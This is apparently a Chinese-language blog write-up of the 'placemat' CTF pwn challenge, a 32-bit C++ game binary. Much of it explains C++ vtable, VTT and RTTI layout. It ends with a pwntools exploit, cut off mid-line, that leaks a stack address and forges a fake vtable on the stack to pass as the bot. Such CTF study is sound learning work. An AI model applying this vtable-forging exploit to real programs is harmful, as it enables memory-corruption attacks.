<li>看到一个meson.build文件, 才知道这是一个和cmake同类型的build scripts generation. Wiki<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_build_automation_software">在此</a> </li>
</ul>
<p>居然是32位程序, 除了PIE其他都开了. </p>
<p>woc为什么在ubuntu上运行不了?? 2.34用allinone装上之后都没有了符号链接, 这能用???? 在ubuntu2004 22204里运行都给我说no such file or directory. 差不多得了. </p>
<p>搞不定这个环境. 理解不能, 这c++的库都是用的啥? glibc不能直接用吧. 果然还是放弃这种比赛题比较实际, 大半天啥也没试出来. 又被crazyman叫来看看, 我…还是试试从源码编译吧…</p>
<ul>
<li>学了两下meson: <code>meson setup [build directory]</code> <code>cd [build directory] &amp;&amp; meson compile</code> <ul>
<li>每个build directory都有各自的配置, 分成一个个文件夹便于测试. </li>
<li><code>meson compile == ninja</code>, 因为meson的默认backend是ninja. </li>
</ul>
</li>
<li>发现缺失<code>bits/c++config.h</code>, 然后准备安装<code>g++-multilib</code>, 然后又发现kali里的libc6-dev版本过低导致依赖的libglib2.0-dev也较低, 结果是libglib2.0-dev无法安装更新版本. 执行<code>pc apt --only-upgrade install libc6-dev</code>后解决. 最终执行<br><code>apt install g++-multilib</code>. </li>
</ul>
<p>怎么调试C++里面的类和一些变量布局我还得熟悉下. </p>
<ul>
<li>看了看C++17的optional. <a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/cppblog/stdoptional-how-when-and-why/">post</a> 就像是刚刚看的rust里的Option&lt;T&gt;. </li>
<li>额还得看看c++编译器是怎么实现class的. 找个<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/508050978">文章</a>.  </li>
</ul>
<hr>
<p>可能有的问题:</p>
<ul>
<li>Human::requestName中<code>scanf(&quot;%s&quot;, this-&gt;name);</code>没有限制长度. 鬼知道溢出到了什么地方. 好了现在知道了.</li>
<li>还有个strcpy有个非常没用的栈溢出. </li>
<li>flag的获取必须是赢过bot. </li>
</ul>
<p>然后队里别人先做出来了(不出所料), 是伪造虚表然后装成bot, 自己赢过自己获取flag. 我先调试看看c++的class<strong>怎么布局</strong>的. </p>
<ul>
<li>首先研究构造函数, 发现<code>Human human</code>声明语句即构造函数调用语句, 参数为栈上指针, 大小为ebp-0x20的位置, 这个就是this指针. 然后继续调用父类构造清空name成员, name成员由this来定位. 不过name不是this指向的空间, 前四字节是用来标识子类的一串数字(也许有什么特殊含义). 好吧原来是虚表地址, <em>对象的虚表指针用来指向自己所属类的虚表，虚表中的指针会指向其继承的<strong>最近的</strong>一个类的虚函数</em>. 地址到IDA里看看更多信息. </li>
<li>Player这个基类的两个函数加析构都是虚函数, 但是析构没有定义, 所以在<strong>虚表里面是NULL</strong>.  </li>
<li>超出作用域的class直接调用析构函数, 如局部class在函数末尾的析构. </li>
<li>注意到文件里除了vtable for Bot之类的还有</li>
<li>果然还是ABI标准更全面一些. <del>省的自己在这儿乱研究</del>. 标准真的太长了. <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/60454989/how-is-type-info-implemented">stackoverflow</a> </li>
</ul>
<p>继续研究:</p>
<ul>
<li>在startSingleplayer()函数栈帧里存储有两个玩家的object, 以虚指针开头总共4(vptr)+20(name)=24=0x18字节, 初始name被填满空字符, 输入玩家名称时可以填满20字节<del>达到leak之后的数据的目的</del>. scanf会加空字符, 必须修改后才能leak. </li>
<li>human是栈上靠近栈底的变量, 在[ebp-0x20]的位置, 0xc(12)处还有个canary, 栈底八字节没啥用处</li>
<li><del>takeTurn中又是%s, 输出长度没有限制.</del>  </li>
</ul>
<blockquote>
<p>重大发现, 这个程序是32位的, 所以要用32位库. 真是好一个重大发现, 难怪patchelf和ubuntu2204(默认没有32位运行环境)都不行. 好的下了debian32位2.35libc成功了. </p>
</blockquote>
<blockquote>
<p>绝了, 自己编译的做不出来, 但是源文件是可以的, <del>因为两个class离canary有更大的距离,</del> 因为Game class放到了两个Player class的后面, 而Game前几个成员变量是player opponent之类的, 可以解决scanf默认添加的空字符问题. emmmm这样究竟是怎么出题的, 是巧合还是能控制变量在栈上的位置? 但是源文件调试是真的不爽, 什么符号都没有. 难不成要ida修复符号然后远程调试? 想想都麻烦. 而且有些输入不是我能打出来的. 还是pwntools吧. </p>
</blockquote>
<blockquote>
<ul>
<li><del>我是不明白为什么random::bit会一直只选第一个玩家, 完全没有随机性可言. 但是自己编译的程序就可以. (????????)</del> <del>只是我运气好罢了.</del> 居然是下面这个问题的原因. </li>
<li>为什么都定义了%20s了但是在printPlayerNames还是会打印出超过20个字符???????什么魔法啊这是.<br>我又知道了, 原来scanf和printf也是不一样的. <code>printf(&quot;%20s&quot;, buf);</code>限制的只是对齐宽度, 如果字符串更长就会忽略这个对齐. <code>%20s</code>用在scanf里才是限制输入的string, 然而在printf里如果要限制输出长度则要用<code>%.20s</code>, 或者是在参数中提供长度<code>%.*s</code>(还可以是某个位置的参数, 具体见printf手册)(左对齐是<code>%-20s</code>)</li>
</ul>
</blockquote>
<ul>
<li>在congratulate中看到<a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/typeid"><code>typeid</code></a>宏, 对一个多态对象求类型id. 实质上是???? 只查到是查个虚表, 待我看看汇编. 看到了<a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">c++ abi</a>, 然而内容太多我抓不住重点. 又找了一个series <a target="_blank" rel="noopener" href="https://shaharmike.com/cpp/vtable-part1/">blog</a>. 真的太多了, 但我真的想看懂ABI.<br>不如Stack Overflow里的<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class">清楚</a> 还是有例子的好些, 一堆文字真的很难看懂. </li>
</ul>
<h3 id="c-abi-vtables-amp-RTTI"><a href="#c-abi-vtables-amp-RTTI" class="headerlink" title="c++ abi (vtables &amp; RTTI)"></a>c++ abi (vtables &amp; RTTI)</h3><h4 id="vtable"><a href="#vtable" class="headerlink" title="vtable:"></a>vtable:</h4><ul>
<li><p>_ZTV is a prefix for vtable, _ZTS is a prefix for type-string (name) and _ZTI is for type-info.</p>
</li>
<li><p>重要的概念</p>
<ul>
<li><em>primary base class</em>: For a dynamic class, the unique base class (if any) with which it shares the virtual pointer at offset 0.</li>
<li><em>proper base class</em>: 继承树中一个类的所有父类</li>
<li><em>secondary virtual table</em>: The instance of a virtual table for a base class that is <strong>embedded</strong> in the virtual table of a class derived from it.</li>
<li><em>The primary virtual table</em> can be viewed as two virtual tables accessed from <strong>a shared virtual table</strong> pointer. </li>
<li><em>virtual table group</em>: The primary virtual table for a class along with all of the associated secondary virtual tables for its proper base classes.</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-components">vtable components</a> </p>
<ul>
<li><em>Virtual Base (vbase) offsets</em> are used to access the virtual bases of an object.</li>
<li>The <em>offset to top</em> holds the displacement to the top of the object from the location within the object of the virtual table pointer that addresses this virtual table</li>
<li>The <em>typeinfo pointer</em> points to the typeinfo object used for RTTI </li>
<li>The virtual table address point <strong>points here</strong> </li>
<li><em>Virtual function pointers</em>. Each pointer holds either the address of a virtual function of the class, or the address of a secondary entry point that performs certain adjustments before transferring control to a virtual function.</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-construction">vtable construction</a> 详细讲了proper base class在各种情况下应该怎样构建vtable. </p>
<ul>
<li>比如<br><code>No inherited virtual functions</code><br><code>No virtual base classes</code><br><code>Declares virtual functions</code>时, vtable就是简单的offset-to-top &amp; RTTI fields &amp; virtual function pointers</li>
<li>………………………………….</li>
</ul>
</li>
<li><p>The elements of the VTT array for a class D:<br>which is declared for each class type that <strong>has indirect or direct virtual base classes</strong>.</p>
<ul>
<li><p><strong>Primary virtual pointer</strong></p>
<p>: address of the primary virtual table for the complete object D.</p>
</li>
<li><p><strong>Secondary VTTs</strong></p>
<p>: for each direct non-virtual proper base class B of D that requires a VTT, in declaration order, a sub-VTT for B-in-D, structured like the main VTT for B, with a primary virtual pointer, secondary VTTs, and secondary virtual pointers, but without virtual VTTs.</p>
<p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" srcset="/img/loading.gif" lazyload alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>This construction is applied recursively.</em></p>
</li>
<li><p><strong>Secondary virtual pointers</strong></p>
<p>: for each base class X which (a) has virtual bases or is reachable along a virtual path from D, and (b) is not a non-virtual primary base, the address of the virtual table for X-in-D or an appropriate construction virtual table.</p>
<p>X is reachable along a virtual path from D if there exists a path X, B1, B2, …, BN, D in the inheritance graph such that at least one of X, B1, B2, …, or BN is a virtual base class.</p>
<p>The order in which the virtual pointers appear in the VTT is inheritance graph preorder.</p>
<p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" srcset="/img/loading.gif" lazyload alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>There are virtual pointers for direct and indirect base classes. Although primary non-virtual bases do not get secondary virtual pointers, they do not otherwise affect the ordering.</em></p>
<p><em>Primary virtual bases require a secondary virtual pointer in the VTT because the derived class with which they will share a virtual pointer is determined by the most derived class in the hierarchy.</em></p>
<p><em>Secondary virtual pointers may be required for base classes that do not require secondary VTTs. A virtual base with no virtual bases of its own does not require a VTT, but does require a virtual pointer entry in the VTT.</em> </p>
</li>
<li><p><strong>Virtual VTTs</strong></p>
<p>: For each proper virtual base classes in inheritance graph preorder, construct a sub-VTT as in (2) above.</p>
<p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" srcset="/img/loading.gif" lazyload alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>The virtual VTT addresses come last because they are only passed to the virtual base class constructors for the complete object.</em></p>
</li>
</ul>
</li>
<li><p>单继承</p>
<ul>
<li>子类虚表如下, 注意子类内存中虚表指针指向下表第三项. 即跳过前两项. </li>
</ul>
<table>
<thead>
<tr>
<th>Address</th>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>0x400b40</td>
<td>0x0</td>
<td><code>top_offset</code> (more on this later)</td>
</tr>
<tr>
<td>0x400b48</td>
<td>0x400b90</td>
<td>Pointer to <code>typeinfo for Derived</code> (also part of the above memory dump)</td>
</tr>
<tr>
<td>0x400b50</td>
<td>0x400a80</td>
<td>Pointer to <code>Derived::Foo()</code>3. <strong><code>Derived</code>’s _vptr points here.</strong></td>
</tr>
<tr>
<td>0x400b58</td>
<td>0x400a90</td>
<td>Pointer to <code>Parent::FooNotOverridden()</code> (same as <code>Parent</code>’s)</td>
</tr>
</tbody></table>
</li>
<li><p>多继承</p>
<ul>
<li>多继承时最下层的子类的内存中有多个指针, 如下表所示. 为什么内存中还有两个vptr? 因为child可能被转换为<code>Father*</code>或者<code>Mother*</code>类型的指针当做参数传递, 此时接收参数的函数不需要知道child的存在也能够访问下面内存布局中的Father部分. data显然在要其中, 而Father的虚表指针自然也会在这里, 指向child vtable以提供虚函数的信息. </li>
</ul>
<table>
<thead>
<tr>
<th>_vptr$Mother</th>
</tr>
</thead>
<tbody><tr>
<td>mother_data (+ padding)(这是什么padding??)</td>
</tr>
<tr>
<td>_vptr$Father = non-virtual thunk to Child::FatherFoo(void)</td>
</tr>
<tr>
<td>father_data</td>
</tr>
<tr>
<td>child_data1</td>
</tr>
</tbody></table>
<ul>
<li>值得注意的是现在child vtable里实际上装下了<strong>两个table</strong>. 如下vtable的第二部分. </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `vtable for&#x27;Child<br>_ZTV5Child       dq 0                    ; offset to this<br>                 dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>off_555555557D48 dq offset _ZN6Mother9MotherFooEv<br>                                        ; DATA XREF: main+8↑o<br>                                        ; Mother::MotherFoo(void)<br>                 dq offset _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>                 dq -8                   ; offset to this<br>                 dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>off_555555557D68 dq offset _ZThn8_N5Child9FatherFooEv<br>                                     ; `non-virtual thunk to&#x27;Child::FatherFoo(void)<br></code></pre></div></td></tr></table></figure></li>
<li><p><strong>但是</strong>, 当子类继承父类时<strong>重载了</strong>父类函数, 为了要使 利用多态将<code>child* this</code>的指针转换为<code>father* this</code>然后<code>ptr-&gt;FatherFoo()</code>的函数能够执行<strong>child</strong>::FatherFoo(), 编译器会识别到重载的存在, 并生成上表的child class结构, 并且生成一个thunk代码片段代替Father::Foo()来调整this指针使得其变成child的class ptr. 其中<code>_vptr$Father</code>指向的secondary virtual table中会是这个thunk的地址. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000555555555227 ; __int64 __fastcall `non-virtual thunk to&#x27;Child::FatherFoo(Child *__hidden this)<br>.text:0000555555555227                 public _ZThn8_N5Child9FatherFooEv<br>.text:0000555555555227 _ZThn8_N5Child9FatherFooEv proc near<br>.text:0000555555555227                 sub     rdi, 8          ; this<br>.text:000055555555522B                 jmp     short _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>.text:000055555555522B _ZThn8_N5Child9FatherFooEv endp<br></code></pre></div></td></tr></table></figure>

<ul>
<li>vtable中top_offset即为-8的那一行,  看起来只是提供一个信息提示, 指child内存中Father部分到内存top的距离.<br>thunk代码中直接使用<code>sub rdi, 8</code>并未引用该处数据. </li>
</ul>
</li>
<li><p>三重多继承, 虚继承Grandparent class.</p>
<ul>
<li>新东西: <code>construction vtable for Parent1-in-Child</code> <code>VTT for Child</code> <code>virtual-base offset</code> </li>
<li><code>virtual-base offset</code>是针对Child::Child()中Patent1初始化时要访问Grandpatent数据时, this指针(此时指向Child内存中Parent1部分, 也就是Child开头)到child内存中Grandpatent部分的偏移量. </li>
<li>IDA中<code>construction vtable for Patent1-in-Child</code>和<code>vtable for Parent</code>基本重叠, 除了前者开头的<code>virtual-base offset</code>在后者上方.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `construction vtable for&#x27; Parent1-in-Child<br>    _ZTC5Child0_7Parent1 dq 20h     ; that is virtual-base offset<br>; `vtable for&#x27; Parent1<br>    ...<br></code></pre></div></td></tr></table></figure>

<ul>
<li>VTT</li>
</ul>
<table>
<thead>
<tr>
<th>Address</th>
<th>Value</th>
<th>Symbol</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>0x4009a0</td>
<td>0x400950</td>
<td><code>vtable for Child + 24</code></td>
<td><code>Parent1</code>’s entries in <code>Child</code>’s vtable</td>
</tr>
<tr>
<td>0x4009a8</td>
<td>0x4009f8</td>
<td><code>construction vtable for Parent1-in-Child + 24</code></td>
<td><code>Parent1</code>’s methods in <code>Parent1-in-Child</code></td>
</tr>
<tr>
<td>0x4009b0</td>
<td>0x400a18</td>
<td><code>construction vtable for Parent1-in-Child + 56</code></td>
<td><code>Grandparent&#39;s methods for Parent1-in-Child</code></td>
</tr>
<tr>
<td>0x4009b8</td>
<td>0x400a98</td>
<td><code>construction vtable for Parent2-in-Child + 24</code></td>
<td><code>Parent2&#39;s methods in Parent2-in-Child</code></td>
</tr>
<tr>
<td>0x4009c0</td>
<td>0x400ab8</td>
<td><code>construction vtable for Parent2-in-Child + 56</code></td>
<td>`Grandparent’s methods for Parent2-in-Child</td>
</tr>
<tr>
<td>0x4009c8</td>
<td>0x400998</td>
<td><code>vtable for Child + 96</code></td>
<td>`Grandparent’s entries in Child’s vtable</td>
</tr>
<tr>
<td>0x4009d0</td>
<td>0x400978</td>
<td><code>vtable for Child + 64</code></td>
<td>`Parent2’s entries in Child’s vtable</td>
</tr>
</tbody></table>
<p>为什么会有VTT? 来看看child的初始化就明白了:</p>
<ul>
<li>首先Grandparent construction, 初始化vtable指针指向primary vtable. </li>
<li>然后Parent1初始化Child内存中的vtable ptr为VTT中Parent1-in-Child值(也就是vtable for Parent1),<br><strong>再修改GrandParent vtable指针指向其vtable中的Grandparent部分</strong>. 关键在于Parent1如何知道其子类Child内存中Grandparent和他自身的距离? 方法就是传入了VTT地址, 两个Parent1-in-Child指针指示了对应的construction table和该table中的vbase offset. <ul>
<li>其实这种情况下只传一个指针也是足够的, 但是当parent也有多个基类时就不得不使用VTT了, 很明显需要访问其多个基类的secondary vtable中的vbase offset来确定多个基类的vtable指针值(都在Child内存中). </li>
</ul>
</li>
<li>然后Parent2继续初始化并且又修改了Grandparent的vtable指针. </li>
<li>因为基类的构造不应假设是其子类调用的构造函数, 所以最后Child把所有vtable指针值改向了Child vtable中的几个父类部分. </li>
</ul>
<p>如果情况变成</p>
</li>
<li><p>“in-charge” and “not-in-charge” constructor and destructor: stackoverflow<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class#:~:text=Now%2C%20in%20fact%2C%20the%20story%20is%20somewhat%20more%20complicated.">解释</a>  </p>
<blockquote>
<p>构造函数可以不一样: 还是上面的例子, 如果出现了Child的定义, 但是还出现了Parent的定义, 就会有两个Parent构造函数,一个只用在Child::Child()中, 另一个用在Parent自身的构造之中. 也是所谓的in or not in charge constructor</p>
</blockquote>
<ul>
<li>An “in-charge” (or complete object) constructor is one that constructs virtual bases,<br>and a “not-in-charge” (or base object) constructor is one that does not.</li>
<li>嗯, 不想看了. 还有一些destructor的东西. </li>
</ul>
</li>
<li><p>多重继承时vtable最后的是VTT, 也就是vtable的table. </p>
</li>
</ul>
<h4 id="RTTI"><a href="#RTTI" class="headerlink" title="RTTI:"></a><strong>RTTI</strong>:</h4><ul>
<li>The typeid operator produces a <strong>reference</strong> to a std::type_info structure with the following public interface</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> std &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">type_info</span> &#123;</span><br>    <span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">type_info</span>();<br>  <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br>  <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>!=(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">before</span><span class="hljs-params">(<span class="hljs-keyword">const</span> type_info &amp;)</span> <span class="hljs-keyword">const</span></span>;<br>  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    <span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">type_info</span> (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>  type_info&amp; <span class="hljs-keyword">operator</span>= (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>  &#125;;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>除了指向不完全类型的直接或间接指针外，相等和不等操作符在操作type_info对象时可以写成地址比较:两个type_info结构体当且仅当它们是相同的结构体(在相同的地址)时，它们描述的是相同的类型。</li>
<li>layout<ul>
<li><code>abi::__class_type_info</code> is used for class types having no bases, and is also a base type for the other two class type representations.</li>
<li>不看了. </li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268094.htm">看雪blog</a> </li>
</ul>
<hr>
<h3 id="BIN"><a href="#BIN" class="headerlink" title="BIN"></a>BIN</h3><p>真的会累死. 回过头来一看typeid也就是这么点东西: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> __cdecl <span class="hljs-built_in">std</span>::type_info::<span class="hljs-keyword">operator</span>==(<span class="hljs-built_in">std</span>::type_info *a1, <span class="hljs-built_in">std</span>::type_info *a2)<br>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">std</span>::__is_constant_evaluated() )<br>    <span class="hljs-keyword">return</span> a1 == a2;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)a1 + <span class="hljs-number">1</span>) == *((_DWORD *)a2 + <span class="hljs-number">1</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( **((_BYTE **)a1 + <span class="hljs-number">1</span>) == <span class="hljs-number">42</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v3 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)<span class="hljs-built_in">std</span>::type_info::name(a2);<br>  <span class="hljs-keyword">return</span> !<span class="hljs-built_in">strcmp</span>(*((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)a1 + <span class="hljs-number">1</span>), v3);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>第二个if直接比较的是demangled name. 但是简单的修改指针为Bot虚表会导致执行Bot::taketurn对象函数. 所以我们需要伪造整个虚表,就在栈上, 所以才需要leak栈指针. 这个修改发生在第二局, 此时进入的是Game::Multiplayer(), 就算破坏canary也没有关系, 能够在Game::play()函数里执行congratulate就可以了. </p>
<blockquote>
<p>嗯, 需不需要四字节对齐? 好吧栈上的东西已经是对齐的了, 只要从name开头就可以. </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.rodata:0804C35C                 dd 0                    ; offset to this<br>.rodata:0804C360                 dd offset _ZTI5Human    ; `typeinfo for&#x27;Human<br>.rodata:0804C364 off_804C364     dd offset _ZN5HumanD2Ev ; DATA XREF: Human::Human(void)+15↑o<br>.rodata:0804C364                                         ; Human::~Human()+6↑o<br>.rodata:0804C364                                         ; Human::~Human()<br>.rodata:0804C368                 dd offset sub_804AEF2<br>.rodata:0804C36C                 dd offset requestName<br>.rodata:0804C370                 dd offset Human__takeTurn<br><br>.rodata:0804C1D4 ; `typeinfo for&#x27;Bot<br>.rodata:0804C1D4 _ZTI3Bot        dd offset unk_804EEC8   ; DATA XREF: sub_804AA96+8C↑o<br>.rodata:0804C1D4                                         ; .rodata:0804C1A8↑o<br>.rodata:0804C1D8                 dd offset a3bot         ; &quot;3Bot&quot;<br>.rodata:0804C1DC                 dd offset off_804C1E8<br></code></pre></div></td></tr></table></figure>

<p>伪造成上面这个样子, 除了typeinfo部分要换成Bot的typeinfo地址. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr])<br>pl2 = flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF18</span>, <span class="hljs-number">0x804AF4E</span>])<br></code></pre></div></td></tr></table></figure>

<p>注意Game class没有虚表指针, 不要看多了就看什么都是虚表. </p>
<p>好吧这样不行, 忽略了后面紧跟着的Game. 会被<strong>覆盖</strong>.</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&#x27;./placemat&#x27;</span><br>p = process(<span class="hljs-string">&quot;./placemat&quot;</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;yog&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>ru(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>p2_name_addr = stack_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span><br><br>log.success(<span class="hljs-string">f&#x27;leak value: 0x<span class="hljs-subst">&#123;stack_addr:x&#125;</span>&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr+<span 